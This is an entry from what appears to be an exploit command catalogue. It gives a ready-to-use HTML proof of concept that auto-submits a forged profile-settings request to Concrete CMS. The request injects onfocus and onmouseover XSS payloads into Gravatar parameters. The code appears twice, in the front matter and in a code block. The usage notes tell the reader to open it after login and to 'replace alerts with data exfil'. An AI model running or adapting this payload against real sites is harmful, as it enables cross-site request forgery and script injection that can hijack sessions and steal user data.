---
data: >-
  <html>

  <body>

  <form method="POST"
  action="http://[host]/concrete5/index.php/dashboard/system/registration/profiles/update_profiles">

  <input type="hidden" name="public_profiles" value="1">

  <input type="hidden" name="gravatar_fallback" value='1'>

  <input type="hidden" name="gravatar_max_level" value='" autofocus
  onfocus="alert(1)'>

  <input type="hidden" name="gravatar_image_set" value='"
  onmouseover="alert(2)'>

  </form>

  <script>document.forms[0].submit()</script>

  </body>

  </html>
tags:
  - xss
  - exploit
type: command
output: null
executor: browser
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:41.391Z'
id: 7255cc4e-af64-4db6-a9e1-71fdbb71905e
verified: false
validated: true
submitted: true
---
# update-profile-with-xss-in-gravatar-params

## Command

```html
<html>
<body>
<form method="POST" action="http://[host]/concrete5/index.php/dashboard/system/registration/profiles/update_profiles">
<input type="hidden" name="public_profiles" value="1">
<input type="hidden" name="gravatar_fallback" value='1'>
<input type="hidden" name="gravatar_max_level" value='" autofocus onfocus="alert(1)'>
<input type="hidden" name="gravatar_image_set" value='" onmouseover="alert(2)'>
</form>
<script>document.forms[0].submit()</script>
</body>
</html>
```

## Description

Auto-submits profile update with event-handler XSS payloads in Gravatar parameters for Concrete CMS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| gravatar_max_level | Payload for onfocus event | Yes |
| gravatar_image_set | Payload for onmouseover event | Yes |
| action URL | Profile update endpoint | Yes |

## Examples

### Basic Usage

Open HTML in browser after login.

### Advanced Usage

Replace alerts with data exfil.

## Expected Output

Settings updated; alerts on interaction.

## Related

- [[Related Procedure]]
